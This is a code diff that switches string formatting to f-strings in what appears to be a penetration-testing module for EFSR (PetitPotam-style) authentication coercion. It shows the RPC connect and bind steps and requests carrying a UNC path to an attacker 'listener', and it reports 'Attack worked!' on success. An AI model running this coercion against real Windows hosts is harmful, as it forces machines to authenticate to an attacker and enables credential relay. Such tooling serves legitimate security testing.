@@ -86,7 +86,7 @@ class DCERPCSessionError(DCERPCException):
                 error_msg_verbose,
             )
         else:
-            return "EFSR SessionError: unknown error code: 0x%x" % self.error_code
+            return f"EFSR SessionError: unknown error code: 0x{self.error_code:x}"
 
 
 ################################################################################
@@ -248,18 +248,18 @@ def coerce(
         rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)
         dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
 
-    context.log.info("[-] Connecting to %s" % binding_params[pipe]["stringBinding"])
+    context.log.info(f"[-] Connecting to {binding_params[pipe]['stringBinding']}")
     try:
         dce.connect()
     except Exception as e:
-        context.log.debug("Something went wrong, check error status => %s" % str(e))
+        context.log.debug(f"Something went wrong, check error status => {str(e)}")
         sys.exit()
     context.log.info("[+] Connected!")
-    context.log.info("[+] Binding to %s" % binding_params[pipe]["MSRPC_UUID_EFSR"][0])
+    context.log.info(f"[+] Binding to {binding_params[pipe]['MSRPC_UUID_EFSR'][0]}")
     try:
         dce.bind(uuidtup_to_bin(binding_params[pipe]["MSRPC_UUID_EFSR"]))
     except Exception as e:
-        context.log.debug("Something went wrong, check error status => %s" % str(e))
+        context.log.debug(f"Something went wrong, check error status => {str(e)}")
         sys.exit()
     context.log.info("[+] Successfully bound!")
     return dce
@@ -268,7 +268,7 @@ def coerce(
 def efs_rpc_open_file_raw(dce, listener, context=None):
     try:
         request = EfsRpcOpenFileRaw()
-        request["fileName"] = "\\\\%s\\test\\Settings.ini\x00" % listener
+        request["fileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
         request["Flag"] = 0
         dce.request(request)
 
@@ -283,7 +283,7 @@ def efs_rpc_open_file_raw(dce, listener, context=None):
             context.log.info("[-] Sending EfsRpcEncryptFileSrv!")
             try:
                 request = EfsRpcEncryptFileSrv()
-                request["FileName"] = "\\\\%s\\test\\Settings.ini\x00" % listener
+                request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
                 dce.request(request)
             except Exception as e:
                 if str(e).find("ERROR_BAD_NETPATH") >= 0:
@@ -291,6 +291,6 @@ def efs_rpc_open_file_raw(dce, listener, context=None):
                     context.log.info("[+] Attack worked!")
                     return True
                 else:
-                    context.log.debug("Something went wrong, check error status => %s" % str(e))
+                    context.log.debug(f"Something went wrong, check error status => {str(e)}")
         else:
-            context.log.debug("Something went wrong, check error status => %s" % str(e))
+            context.log.debug(f"Something went wrong, check error status => {str(e)}")
